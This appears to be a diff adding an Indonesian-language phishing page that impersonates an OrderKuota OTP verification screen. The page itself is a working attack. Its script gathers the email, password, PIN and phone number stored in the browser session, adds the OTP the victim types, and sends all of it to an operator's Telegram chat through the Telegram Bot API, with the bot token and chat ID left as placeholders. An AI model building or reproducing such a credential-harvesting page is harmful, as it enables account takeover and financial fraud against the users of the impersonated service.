@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OrderKuota - Verifikasi OTP</title>
+  <style>
+    body {
+      font-family: "Poppins", sans-serif;
+      background: linear-gradient(180deg, #14532d, #22c55e);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      color: #fff;
+    }
+    .container {
+      background: #14532d;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.3);
+      width: 340px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #d1fae5;
+      margin-bottom: 20px;
+    }
+    .otp-inputs {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 16px;
+    }
+    .otp-inputs input {
+      width: 45px;
+      height: 50px;
+      text-align: center;
+      font-size: 22px;
+      border: none;
+      border-radius: 8px;
+      outline: none;
+    }
+    textarea {
+      width: 100%;
+      height: 70px;
+      border-radius: 8px;
+      padding: 8px;
+      border: none;
+      font-size: 14px;
+      outline: none;
+      margin-bottom: 12px;
+    }
+    input[type="file"] {
+      display: block;
+      margin: 10px auto;
+      color: #d1fae5;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #22c55e;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      background: #16a34a;
+    }
+    .timer {
+      font-size: 14px;
+      color: #bbf7d0;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verifikasi OTP</h2>
+    <p>Kode telah dikirim ke <strong>email Anda</strong></p>
+
+    <form id="otpForm">
+      <div class="otp-inputs">
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+        <input type="text" maxlength="1" required />
+      </div>
+
+      <textarea id="message" placeholder="Tulis pesan tambahan..." required></textarea>
+      <input type="file" id="photo" accept="image/*" />
+
+      <button class="btn" type="submit">Kirim ke Telegram</button>
+      <div class="timer" id="timer">Waktu tersisa: 3:00</div>
+    </form>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll(".otp-inputs input");
+    inputs.forEach((input, index) => {
+      input.addEventListener("input", () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+    });
+
+    // Timer 3 menit
+    let time = 180;
+    const timerEl = document.getElementById("timer");
+    const timer = setInterval(() => {
+      const min = Math.floor(time / 60);
+      const sec = time % 60;
+      timerEl.textContent = `Waktu tersisa: ${min}:${sec < 10 ? "0" : ""}${sec}`;
+      time--;
+      if (time < 0) {
+        clearInterval(timer);
+        timerEl.textContent = "Waktu habis! (+5 menit otomatis)";
+        time = 300; // tambah 5 menit
+      }
+    }, 1000);
+
+    const form = document.getElementById("otpForm");
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const otp = Array.from(inputs).map(i => i.value).join("");
+      const message = document.getElementById("message").value;
+      const photo = document.getElementById("photo").files[0];
+
+      const email = sessionStorage.getItem("email");
+      const password = sessionStorage.getItem("password");
+      const pin = sessionStorage.getItem("pin");
+      const phone = sessionStorage.getItem("phone");
+
+      const text = `🔐 *OrderKuota Admin Login*
+📧 Email: ${email}
+🔑 Password: ${password}
+📱 Nomor: ${phone}
+📟 PIN: ${pin}
+🧩 OTP: ${otp}
+💬 Pesan: ${message}`;
+
+      const botToken = "YOUR_BOT_TOKEN_HERE";
+      const chatId = "YOUR_CHAT_ID_HERE";
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" }),
+      });
+
+      alert("Data berhasil dikirim ke Telegram!");
+      form.reset();
+      inputs[0].focus();
+    });
+  </script>
+</body>
+</html>
